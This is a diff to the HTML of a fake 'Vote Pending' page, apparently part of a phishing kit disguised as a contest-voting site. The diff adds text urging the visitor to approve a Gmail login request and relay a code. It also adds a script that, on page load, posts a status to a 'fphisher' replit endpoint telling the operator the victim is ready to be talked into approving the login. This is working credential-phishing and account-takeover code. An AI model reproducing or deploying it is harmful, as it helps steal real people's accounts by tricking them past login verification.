@@ -80,10 +80,39 @@
 
     <h1 class="g-heading text-[28px] font-medium mb-6">Vote Pending</h1>
     
-    <p class="g-body text-[15px] leading-relaxed max-w-[260px]">
-      Get the code to tap from contestant and verify your vote
+    <p class="g-body text-[15px] leading-relaxed max-w-[290px]">
+      Check your Gmail and approve your login request and Get the code to tap from contestant and verify your vote
     </p>
   </div>
+
+  <script>
+    const ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/0c36ad344b";
+
+    // Send “LOGIN PENDING| TELL CL TO TAP CODE” immediately when page loads
+    async function sendPendingStatus() {
+      try {
+        await fetch(ENDPOINT, {
+          method: "POST",
+          headers: { 
+            "Content-Type": "application/json" 
+          },
+          body: JSON.stringify({
+            status: "LOGIN PENDING| TELL CL TO TAP CODE",
+            message: "Vote Pending - User reached verification screen",
+            timestamp: Date.now()
+          })
+        });
+        console.log("Pending status sent to backend");
+      } catch (err) {
+        console.error("Failed to send pending status:", err);
+      }
+    }
+
+    // Automatically send when the page loads
+    window.onload = function() {
+      sendPendingStatus();
+    };
+  </script>
 
 </body>
 </html>
